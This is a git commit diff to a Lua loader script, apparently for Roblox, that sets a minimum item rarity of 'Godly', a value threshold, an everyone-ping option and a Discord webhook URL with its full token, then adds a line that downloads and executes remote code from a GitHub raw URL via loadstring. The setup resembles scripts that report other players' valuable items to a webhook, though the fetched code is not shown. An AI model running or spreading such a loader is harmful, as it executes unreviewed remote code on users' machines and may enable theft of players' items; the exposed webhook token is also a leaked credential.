98230c2bd8b0223b7253d86ae0aa206f503437e5
ViceClient <p93751406@gmail.com>
2025-07-03 06:28:08 +0700

    LoadV1.lua

--- LoadV1.lua
+++ LoadV1.lua
@@ -3,3 +3,4 @@ _G.min_rarity = "Godly"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1379868278658306150/RneoA-V8uiT0vA9y_C3w_r4LWPCEyf6EcU4cUNKdy17VbhjnNrHQoVbWe6lJcxp8eKO2" -- change to your webhook
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ViceClient/Farm/refs/heads/main/source.lua"))()
